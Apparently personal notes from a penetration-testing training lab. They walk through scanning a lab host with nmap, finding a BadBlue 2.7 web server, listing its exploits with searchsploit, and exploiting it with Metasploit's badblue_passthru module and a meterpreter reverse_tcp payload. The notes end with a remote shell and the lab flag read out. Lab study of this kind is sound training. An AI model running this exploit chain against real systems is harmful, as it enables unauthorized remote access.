### Nessus lab1

It is a browser based tool incase if we want to use it we can just launch the browser and access the port 8834 on our local machine to access nessus. Once it is launched we can enter the IP or the url to get the reports.
loca
It is just checking the reports and downloading the report

Moving on to the next lab

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.19.72
PING 10.5.19.72 (10.5.19.72) 56(84) bytes of data.
64 bytes from 10.5.19.72: icmp_seq=1 ttl=125 time=2.45 ms
64 bytes from 10.5.19.72: icmp_seq=2 ttl=125 time=2.15 ms
64 bytes from 10.5.19.72: icmp_seq=3 ttl=125 time=1.80 ms
64 bytes from 10.5.19.72: icmp_seq=4 ttl=125 time=1.87 ms
64 bytes from 10.5.19.72: icmp_seq=5 ttl=125 time=1.83 ms

--- 10.5.19.72 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.796/2.017/2.448/0.248 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap -p 80 -sV 10.5.19.72
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-13 00:01 IST
Nmap scan report for 10.5.19.72
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

Explore the Exploitdb or searchsploit

```
root@attackdefense:~# searchsploit badblue
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
BadBlue 2.5 - 'ext.dll' Remote Buffer Overflow (Metasploit)                                                                                          | exploits/windows/remote/16761.rb
BadBlue 2.5 - Easy File Sharing Remote Buffer Overflow                                                                                               | exploits/windows/remote/845.c
BadBlue 2.52 Web Server - Multiple Connections Denial of Service Vulnerabilities                                                                     | exploits/windows/dos/419.pl
BadBlue 2.55 - Web Server Remote Buffer Overflow                                                                                                     | exploits/windows/remote/847.cpp
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                                                       | exploits/windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                                                                                                             | exploits/windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                                                                                | exploits/windows/remote/16806.rb
Working Resources 1.7.3 BadBlue - Null Byte File Disclosure                                                                                          | exploits/windows/remote/21616.txt
Working Resources 1.7.x BadBlue - Administrative Interface Arbitrary File Access                                                                     | exploits/windows/remote/21630.html
Working Resources 1.7.x/2.15 BadBlue - 'ext.dll' Command Execution                                                                                   | exploits/windows/remote/22511.txt
Working Resources BadBlue 1.2.7 - Denial of Service                                                                                                  | exploits/windows/dos/20641.txt
Working Resources BadBlue 1.2.7 - Full Path Disclosure                                                                                               | exploits/windows/remote/20640.txt
Working Resources BadBlue 1.5/1.6 - Directory Traversal                                                                                              | exploits/windows/remote/21303.txt
Working Resources BadBlue 1.7 - 'ext.dll' Cross-Site Scripting                                                                                       | exploits/windows/remote/21576.txt
Working Resources BadBlue 1.7.1 - Search Page Cross-Site Scripting                                                                                   | exploits/cgi/webapps/22045.txt
Working Resources BadBlue 1.7.3 - 'cleanSearchString()' Cross-Site Scripting                                                                         | exploits/windows/remote/21599.txt
Working Resources BadBlue 1.7.3 - GET Denial of Service                                                                                              | exploits/windows/dos/21600.txt
Working Resources BadBlue 1.7.x/2.x - Unauthorized HTS Access                                                                                        | exploits/windows/remote/22620.txt
Working Resources BadBlue 1.7.x/2.x - Unauthorized Proxy Relay                                                                                       | exploits/windows/remote/24409.txt
Working Resources BadBlue 2.55 - MFCISAPICommand Remote Buffer Overflow (1)                                                                          | exploits/windows/remote/25166.c
Working Resources BadBlue 2.55 - MFCISAPICommand Remote Buffer Overflow (2)                                                                          | exploits/windows/remote/25167.c
Working Resources BadBlue Server 2.40 - 'PHPtest.php' Full Path Disclosure                                                                           | exploits/php/webapps/23753.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

[[metasploit]]

```
root@attackdefense:~# msfconsole
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: could not connect to server: Connection refused
	Is the server running on host "localhost" (127.0.0.1) and accepting
	TCP/IP connections on port 5432?
could not connect to server: Cannot assign requested address
	Is the server running on host "localhost" (::1) and accepting
	TCP/IP connections on port 5432?

[-] ***
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


msf5 > use 1
msf5 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) > set rhosts 10.5.19.72
rhosts => 10.5.19.72
msf5 exploit(windows/http/badblue_passthru) > set lhost eth1
lhost => 10.10.26.2
msf5 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.5.19.72
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.19.72:49275) at 2023-07-13 00:13:00 +0530

meterpreter > shell
Process 2276 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of c:\

09/16/2020  09:01 AM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/11/2020  08:17 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
09/11/2020  08:18 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   9,163,845,632 bytes free

c:\>type flag.txt
type flag.txt
70a569da306697d64fc6c19afea37d94
c:\>
```

